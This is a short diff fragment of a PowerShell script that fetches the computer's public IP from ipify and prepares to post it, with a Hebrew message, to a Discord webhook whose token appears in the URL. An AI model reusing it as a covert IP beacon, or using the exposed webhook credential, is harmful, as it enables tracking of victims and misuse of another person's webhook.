@@ -2,7 +2,6 @@ $webhook = "https://discord.com/api/webhooks/1380222529209241680/jOwJW5pI3_hLmcp
 
 $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
 
-# יוצר SON
 $body = @{
     content = "ה-IP החיצונית של המחשב: $publicIP"
 } | ConvertTo-Json -Depth 3
